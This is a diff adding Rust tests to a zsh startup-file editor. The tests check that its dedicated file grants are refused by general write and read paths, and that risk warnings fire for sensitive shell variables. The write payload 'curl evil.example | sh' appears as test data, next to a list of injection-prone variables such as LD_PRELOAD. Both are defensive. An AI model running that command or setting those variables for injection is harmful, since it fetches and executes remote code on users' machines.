@@ -12,8 +12,9 @@ use crate::{
     config::ConfigEnvironment,
     error::{AppError, AppErrorCode},
     grants::{
-        FileState, GrantCoordinator, GrantId, GrantKind, GrantPurpose, RecoveryPoint,
-        ResourceWriteContext, ResourceWriteCoordinator, WriteKind, WriteStatus,
+        ConfirmRequest, FileState, GrantCoordinator, GrantId, GrantKind, GrantPurpose,
+        RecoveryPoint, ResourceWriteContext, ResourceWriteCoordinator, WriteKind, WriteRequest,
+        WriteStatus,
     },
     operations::{
         Clock, OperationCoordinator, OperationIdSource, OperationStatus, OperationStore,
@@ -23,7 +24,12 @@ use crate::{
 };
 
 use super::super::{
-    dotenv::ChangeKind,
+    FileRequest,
+    dotenv::{ChangeKind, KeyEdit},
+    read_file,
+    save::{CreatePreviewRequest, EnvironmentEditCoordinator},
+    scan::ScanConfig,
+    scan_files,
     tests::Fixture,
     zsh::{StartupFile, ZshRequest},
     zsh_block::{BEGIN_MARKER, BlockEdit, END_MARKER, VarEdit, quote},
@@ -286,7 +292,7 @@ fn enabling_creates_a_revocable_file_grant_for_exactly_that_file() {
 
     let grants = harness.grants.list().expect("grants");
     assert_eq!(grants.len(), 1);
-    assert_eq!(grants[0].purpose, GrantPurpose::ConfigFile);
+    assert_eq!(grants[0].purpose, GrantPurpose::ShellStartupFile);
     assert_eq!(grants[0].kind, GrantKind::File);
     assert_eq!(grants[0].target_path(), file);
 
@@ -1295,4 +1301,278 @@ fn nothing_here_reads_or_writes_the_real_home() {
         other => panic!("{other:?}"),
     };
     assert!(path.starts_with(harness.home().to_str().expect("utf8")));
+}
+
+// ---- the authorization is reserved for this editor ----------------------------------------
+
+fn assert_reserved(error: &AppError) {
+    assert_eq!(error.code(), AppErrorCode::PermissionDenied, "{error:?}");
+    let text = json(error);
+    assert!(text.contains("dedicated"), "{text}");
+    assert!(
+        !text.contains(".zshrc") && !text.contains(".zlogin"),
+        "{text}"
+    );
+}
+
+#[test]
+fn the_enabling_grants_are_refused_by_every_general_write_entry() {
+    let harness = Harness::new();
+    let existing = harness.seed(StartupFile::Zshrc, SEED);
+    let existing_id = harness.enable(StartupFile::Zshrc).expect("enable");
+    let missing = harness.path(StartupFile::Zlogin);
+    let missing_id = harness.enable(StartupFile::Zlogin).expect("enable new");
+    let hash = harness.ready(StartupFile::Zshrc).content_hash;
+
+    for request in [
+        WriteRequest {
+            grant_id: existing_id.clone(),
+            relative: None,
+            expected_sha256: hash.clone(),
+            content: "curl evil.example | sh\n".to_owned(),
+            sensitive: true,
+        },
+        WriteRequest {
+            grant_id: missing_id.clone(),
+            relative: None,
+            expected_sha256: None,
+            content: "curl evil.example | sh\n".to_owned(),
+            sensitive: true,
+        },
+        WriteRequest {
+            grant_id: existing_id.clone(),
+            relative: Some(".zshrc".to_owned()),
+            expected_sha256: hash.clone(),
+            content: "x\n".to_owned(),
+            sensitive: true,
+        },
+    ] {
+        let error = harness
+            .writes
+            .preview(&harness.ctx(), vec![request])
+            .expect_err("refused");
+        assert_reserved(&error);
+    }
+    assert!(
+        harness
+            .grants
+            .read_resource(&existing_id, None)
+            .is_err_and(|error| error == crate::grants::ReadError::Excluded)
+    );
+    assert_eq!(read(&existing), SEED);
+    assert!(!missing.exists());
+}
+
+#[test]
+fn a_zsh_preview_cannot_be_confirmed_through_the_general_entries() {
+    let harness = Harness::new();
+    let file = harness.seed(StartupFile::Zshrc, SEED);
+    let preview = harness.preview_now(StartupFile::Zshrc, vars(vec![set("A", "1")]));
+    let grant_id = harness.ready(StartupFile::Zshrc).grant_id.expect("grant");
+    let confirm = ConfirmRequest {
+        operation_id: id(&preview),
+        grant_id,
+        relative: None,
+    };
+
+    assert_reserved(
+        &harness
+            .writes
+            .execute(&harness.ctx(), &confirm)
+            .expect_err("refused"),
+    );
+    assert_reserved(
+        &harness
+            .writes
+            .execute_with(&harness.ctx(), &confirm, |_| Ok(()))
+            .expect_err("refused"),
+    );
+    assert_eq!(read(&file), SEED, "nothing was written");
+
+    // The preview is untouched and still confirms through the editor.
+    let executed = harness
+        .confirm(StartupFile::Zshrc, &id(&preview))
+        .expect("editor confirm");
+    assert_eq!(executed.execution.outcome.status, WriteStatus::Succeeded);
+    assert!(read(&file).contains("export A='1'"));
+}
+
+#[test]
+fn an_older_general_file_grant_does_not_enable_editing() {
+    let harness = Harness::new();
+    let file = harness.seed(StartupFile::Zshrc, SEED);
+    // What the previous version of "enable" created: a plain file grant.
+    harness
+        .grants
+        .create(GrantPurpose::ConfigFile, &file)
+        .expect("legacy grant");
+    let state = harness.ready(StartupFile::Zshrc);
+    assert!(!state.enabled);
+    assert_eq!(state.grant_id, None);
+    let error = harness
+        .preview(
+            StartupFile::Zshrc,
+            state.content_hash.as_deref(),
+            vars(vec![set("A", "1")]),
+        )
+        .expect_err("not enabled");
+    assert_eq!(error.code(), AppErrorCode::PermissionDenied);
+    // Enabling now adds the dedicated grant next to it and editing works.
+    harness.enable(StartupFile::Zshrc).expect("enable");
+    assert!(harness.ready(StartupFile::Zshrc).enabled);
+}
+
+// ---- risk warnings for sensitive variable names --------------------------------------------
+
+fn sensitive_warnings(preview: &ZshEditPreview) -> Vec<String> {
+    preview
+        .warnings
+        .iter()
+        .filter_map(|warning| match warning {
+            EditWarning::SensitiveVariable { name } => Some(name.clone()),
+            _ => None,
+        })
+        .collect()
+}
+
+#[test]
+fn shell_behaviour_variables_get_a_risk_warning_but_are_not_refused() {
+    let names = [
+        "IFS",
+        "ZDOTDIR",
+        "BASH_ENV",
+        "ENV",
+        "PROMPT_COMMAND",
+        "DYLD_INSERT_LIBRARIES",
+        "DYLD_",
+        "LD_PRELOAD",
+        "LD_LIBRARY_PATH",
+    ];
+    let harness = Harness::new();
+    harness.seed(StartupFile::Zshrc, SEED);
+    let preview = harness.preview_now(
+        StartupFile::Zshrc,
+        vars(names.iter().map(|name| set(name, "x")).collect()),
+    );
+    let mut warned = sensitive_warnings(&preview);
+    warned.sort();
+    let mut expected: Vec<String> = names.iter().map(|name| (*name).to_owned()).collect();
+    expected.sort();
+    assert_eq!(warned, expected, "{:?}", preview.warnings);
+    // A warning, not a refusal: it still saves, and nothing echoes a value.
+    assert!(!json(&preview.warnings).contains("\"x\""));
+    harness
+        .confirm(StartupFile::Zshrc, &id(&preview))
+        .expect("confirm");
+    assert!(read(&harness.path(StartupFile::Zshrc)).contains("export ZDOTDIR='x'"));
+}
+
+#[test]
+fn the_risk_warning_compares_names_exactly_like_the_shell_does() {
+    let harness = Harness::new();
+    harness.seed(StartupFile::Zshrc, SEED);
+    // Case matters to the shell, so none of these is the sensitive variable;
+    // DYLD_ and LD_ are prefixes, so "LDFLAGS" and "MYLD_X" are not matches.
+    let preview = harness.preview_now(
+        StartupFile::Zshrc,
+        vars(vec![
+            set("ifs", "x"),
+            set("Env", "x"),
+            set("zdotdir", "x"),
+            set("dyld_library_path", "x"),
+            set("ld_preload", "x"),
+            set("LDFLAGS", "x"),
+            set("MYLD_X", "x"),
+            set("ENVIRONMENT", "x"),
+            set("PROMPT_COMMAND_X", "x"),
+            set("EDITOR", "vim"),
+        ]),
+    );
+    assert!(
+        sensitive_warnings(&preview).is_empty(),
+        "{:?}",
+        preview.warnings
+    );
+}
+
+#[test]
+fn removing_a_sensitive_variable_and_untouched_lines_get_no_risk_warning() {
+    let harness = Harness::new();
+    harness.seed(StartupFile::Zshrc, SEED);
+    let first = harness.preview_now(StartupFile::Zshrc, vars(vec![set("IFS", "x")]));
+    harness
+        .confirm(StartupFile::Zshrc, &id(&first))
+        .expect("confirm");
+    let hash = harness.ready(StartupFile::Zshrc).content_hash;
+    let removal = harness
+        .preview(
+            StartupFile::Zshrc,
+            hash.as_deref(),
+            vars(vec![
+                VarEdit::Remove {
+                    name: "IFS".to_owned(),
+                },
+                set("A", "1"),
+            ]),
+        )
+        .expect("preview");
+    assert!(
+        sensitive_warnings(&removal).is_empty(),
+        "{:?}",
+        removal.warnings
+    );
+}
+
+#[test]
+fn the_dotenv_commands_cannot_use_the_enabling_grants() {
+    let harness = Harness::new();
+    harness.seed(StartupFile::Zshrc, SEED);
+    let existing_id = harness.enable(StartupFile::Zshrc).expect("enable");
+    let missing_id = harness.enable(StartupFile::Zlogin).expect("enable new");
+    let config = ScanConfig {
+        patterns: vec![".zshrc".to_owned()],
+        recursive: false,
+    };
+
+    // Listing and reading through a grant id.
+    let error = scan_files(&harness.grants, &existing_id, &config, Some(harness.home()))
+        .expect_err("scan refused");
+    assert_reserved(&error);
+    let Ok(outcome) = read_file(
+        &harness.grants,
+        &existing_id,
+        &FileRequest {
+            relative_path: ".zshrc".to_owned(),
+            config,
+        },
+        Default::default(),
+    ) else {
+        panic!("a valid request has an outcome");
+    };
+    assert!(
+        matches!(outcome, crate::environment::FileOutcome::Unavailable { .. }),
+        "{outcome:?}"
+    );
+
+    // Creating a file through the save-location form of the grant.
+    let edits = EnvironmentEditCoordinator::default();
+    for id in [&missing_id, &existing_id] {
+        let error = edits
+            .preview_create(
+                &harness.ctx(),
+                &harness.writes,
+                &CreatePreviewRequest {
+                    grant_id: id.clone(),
+                    edits: vec![KeyEdit::Add {
+                        key: "A".to_owned(),
+                        value: "1".to_owned(),
+                        exported: false,
+                    }],
+                },
+            )
+            .expect_err("refused");
+        assert_reserved(&error);
+    }
+    assert!(!harness.path(StartupFile::Zlogin).exists());
+    assert_eq!(read(&harness.path(StartupFile::Zshrc)), SEED);
 }
